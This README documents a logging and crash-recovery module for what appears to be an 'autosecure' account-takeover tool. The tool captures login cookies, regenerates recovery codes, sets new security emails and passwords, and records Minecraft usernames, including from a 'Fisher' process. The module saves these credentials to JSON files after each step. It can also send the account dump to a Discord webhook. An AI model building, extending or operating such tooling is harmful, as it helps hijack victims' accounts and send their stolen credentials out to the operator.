# Secure Process Logging System

## Overview

A robust logging system has been implemented to prevent data loss during the secure process. The system captures all console output and saves account data incrementally, ensuring that even if the code crashes, all discovered information is preserved.

## Features

### 1. **Console Output Logging**
- All `console.log`, `console.error`, `console.warn`, and `console.info` calls are captured
- Logs are written to timestamped files in `logs/secure/`
- Each log entry includes a timestamp and log level
- Logs are flushed immediately to prevent loss on crash

### 2. **Incremental Account Data Saving**
- Account data is saved to JSON files as it's discovered
- Data is saved at key points:
  - When login cookie is set
  - When email is retrieved
  - When recovery code is obtained
  - When security email and password are set
  - When Minecraft username is found
  - When all security data is retrieved
  - When process completes
- Files are saved atomically (write to temp, then rename) to prevent corruption

### 3. **Process Tracking**
- Each secure process gets a unique UID-based log file
- Steps are tracked with timestamps and elapsed time
- Errors are captured with full stack traces
- Process status: `in_progress`, `completed`, or `failed`

## File Structure

```
logs/
└── secure/
    ├── {uid}_{timestamp}.log          # Console output log
    └── data/
        └── {uid}_{timestamp}.json     # Account data (incremental)
```

## Usage

### Automatic Logging

The logging is **automatically enabled** for:
- `/secure` command (all types: OTP, Recovery Code, MSAUTH, etc.)
- Fisher auto-secure process

No code changes needed - it works automatically!

### Manual Logging (if needed)

```javascript
const { SecureLogger } = require('./autosecure/utils/logging/secureLogger');

const logger = new SecureLogger(uid, 'secure'); // or 'fisher'
logger.startLogging();

try {
    // Your secure process
    logger.logStep('step_name', { data: 'value' });
    logger.updateAccountData({ email: 'test@example.com' });
    logger.complete(result);
} catch (error) {
    logger.fail(error);
} finally {
    logger.close();
}
```

## Log File Format

### Console Log (`{uid}_{timestamp}.log`)
```
[2024-11-22T10:30:45.123Z] [LOG] [RECODE_SECURE] Starting secure process...
[2024-11-22T10:30:45.456Z] [ERROR] Error occurred: ...
[2024-11-22T10:30:46.789Z] [STEP] email_retrieved - {"email":"test@example.com"}
```

### Account Data (`{uid}_{timestamp}.json`)
```json
{
  "uid": "abc123",
  "processType": "secure",
  "startTime": 1700647845123,
  "status": "completed",
  "steps": [
    {
      "name": "email_retrieved",
      "timestamp": 1700647845456,
      "elapsed": 333,
      "data": { "email": "test@example.com" }
    }
  ],
  "account": {
    "email": "test@example.com",
    "recoveryCode": "XXXXX-XXXXX-XXXXX-XXXXX-XXXXX",
    "secEmail": "generated@domain.com",
    "password": "generated_password",
    "oldName": "MinecraftUsername",
    "lastUpdated": 1700647845789
  },
  "errors": [],
  "endTime": 1700647846000,
  "duration": 877
}
```

## Recovery After Crash

If the process crashes:

1. **Check the log file**: `logs/secure/{uid}_{timestamp}.log`
   - Contains all console output up to the crash
   - Shows exactly where it failed

2. **Check the data file**: `logs/secure/data/{uid}_{timestamp}.json`
   - Contains all account data discovered before the crash
   - Status will be `in_progress` or `failed`
   - Check the `account` object for saved data

3. **Recover the data**:
   ```javascript
   const fs = require('fs');
   const data = JSON.parse(fs.readFileSync('logs/secure/data/{uid}_{timestamp}.json'));
   console.log('Recovered account:', data.account);
   ```

## Key Logging Points

The system logs at these critical points:

1. **Process Start**: When secure process begins
2. **Login Cookie Set**: When authentication cookie is received
3. **Email Retrieved**: When account email is found
4. **Recovery Code**: When recovery code is obtained/regenerated
5. **Security Data**: When security email and password are set
6. **Minecraft Found**: When Minecraft username is discovered
7. **Process Complete**: When secure process finishes successfully
8. **Process Failed**: When an error occurs

## Benefits

✅ **No Data Loss**: Account information is saved as it's discovered  
✅ **Crash Recovery**: Can recover data even if process crashes  
✅ **Full Audit Trail**: Complete console output for debugging  
✅ **Automatic**: Works without code changes to existing secure calls  
✅ **Incremental**: Data saved at multiple points, not just at the end  
✅ **Atomic Writes**: Prevents file corruption during writes  

## Performance

- Minimal overhead: Logs are written asynchronously
- Immediate flush: Critical data is synced to disk immediately
- Efficient: Only logs during secure process, not all the time

## Maintenance

Log files can grow over time. Consider:
- Rotating old logs (keep last 30 days)
- Compressing old logs
- Archiving to external storage

Example cleanup script:
```bash
# Keep logs from last 30 days
find logs/secure -name "*.log" -mtime +30 -delete
find logs/secure/data -name "*.json" -mtime +30 -delete
```

## Webhook Notifications 🔔

You can optionally send a secure-process notification (and attached JSON account dump) to a Discord webhook when a secure process completes.

1. Set the webhook URL in `config.json` → `secureWebhook` (leave blank to disable).

2. The webhook message will contain a short summary (UID, duration) and the `.json` account file as an attachment.

> **Note:** Make sure the webhook you provide is private and only accessible by you — the JSON contains sensitive account data.



